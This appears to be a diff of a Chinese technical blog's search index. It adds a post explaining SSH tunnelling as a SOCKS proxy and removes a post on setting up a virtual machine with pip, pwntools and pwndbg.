+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SSH（代表“安全shell”）不是专为转发网络流量而设计的。 一般情况下，SSH用于安全地获取和使用远程终端会话-但SSH有其他用途 。 SSH还使用强加密，您可以将SSH客户端设置为SOCKS代理。 完成后，您可以在计算机上配置应用程序（如Web浏览器）以使用SOCKS代理。 流量进入在本地系统上运行的SOCKS代理，SSH客户端通过SSH连接转发它 - 这被称为SSH隧道。 这类似于通过VPN浏览网络 - 从网络服务器的角度来看，您的流量似乎来自SSH服务器。 计算机和SSH服务器之间的流量已加密，因此您可以通过加密连接浏览，就像使用VPN一样。</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>网络</category>
+      </categories>
+      <tags>
+        <tag>vpn</tag>
+        <tag>ssh</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>一些命令添加sudo后找不到</title>
     <url>/2020/08/02/%E4%B8%80%E4%BA%9B%E5%91%BD%E4%BB%A4%E6%B7%BB%E5%8A%A0sudo%E5%90%8E%E6%89%BE%E4%B8%8D%E5%88%B0/</url>
     <content><![CDATA[<h1 id="sudo-命令执行找不到命令"><a href="#sudo-命令执行找不到命令" class="headerlink" title="sudo 命令执行找不到命令"></a>sudo 命令执行找不到命令</h1><p>如</p>
@@ -816,35 +884,6 @@ sudo gedit pip.conf
       </categories>
       <tags>
         <tag>sudo</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>虚拟机配置</title>
-    <url>/2019/11/15/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<p>#今天讲的是pwndbg的一些基本操作</p>
-<p><strong>1.首先下载Ubuntu</strong><br><a href="https://blog.csdn.net/kwame211/article/details/83902851" target="_blank" rel="noopener">https://blog.csdn.net/kwame211/article/details/83902851</a></p>
-<p><strong>2.安装VMtools</strong></p>
-<p><a href="https://blog.csdn.net/zxf1242652895/article/details/78203473" target="_blank" rel="noopener">https://blog.csdn.net/zxf1242652895/article/details/78203473</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安装时会出现很多提示 输入yes/no  都选 yes，</span><br><span class="line"></span><br><span class="line">如果提示 的是 路径， 则直接回车就好。</span><br></pre></td></tr></table></figure>
-
-<p><strong>3.更换软件源</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">源就是软件源的意思，包管理器从软件源下载软件包，并从软件源下载软件更新，</span><br><span class="line">相当于软件的下载服务器和更新服务器，</span><br><span class="line">只不过不是某款软件的，而是该系统所有软件的下载服务器</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://blog.csdn.net/meteor_s/article/details/81301252" target="_blank" rel="noopener">https://blog.csdn.net/meteor_s/article/details/81301252</a></p>
-<p><strong>4.安装pip</strong></p>
-<p>pip 是“A tool for installing and managing Python packages.”，<br>也就是说pip是python的软件安装工具</p>
-<p>安装直接在终端输入：  sudo apt install python-pip</p>
-<p><strong>5.更改pip源</strong><br>我们在进行Python开发时，经常会通过pip操作来安装一些packages，<br>但是由于网络速度非常慢，安装耗时长，所以我们需要把pip的源设置成国内的</p>
-<p>创建一个配置文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mkdir ~/.pip/</span><br><span class="line">cd ./.pip/</span><br><span class="line">touch pip.conf</span><br><span class="line">sudo gedit pip.conf</span><br></pre></td></tr></table></figure>
-
-<p>按照链接更改配置文件<br><a href="https://blog.csdn.net/yuzaipiaofei/article/details/80891108" target="_blank" rel="noopener">https://blog.csdn.net/yuzaipiaofei/article/details/80891108</a></p>
-<p><strong>6.安装pwntools</strong></p>
-<p><a href="https://www.cnblogs.com/cai00/p/10696728.html" target="_blank" rel="noopener">https://www.cnblogs.com/cai00/p/10696728.html</a></p>
-<p><strong>7.安装pwndbg</strong><br><a href="https://blog.csdn.net/kevin66654/article/details/86773517" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773517</a></p>
-]]></content>
-      <tags>
-        <tag>虚拟机配置</tag>
       </tags>
   </entry>
   <entry>
@@ -896,11 +935,6 @@ sudo gedit pip.conf
       <tags>
         <tag>pwn学习</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>链接</title>
-    <url>/2019/11/05/%E9%93%BE%E6%8E%A5/</url>
-    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>docker基础</title>
@@ -1427,8 +1461,8 @@ CMD [&quot;app.py&quot;]
         <category>堆</category>
       </categories>
       <tags>
-        <tag>linux</tag>
         <tag>malloc</tag>
+        <tag>linux</tag>
       </tags>
   </entry>
 </search>
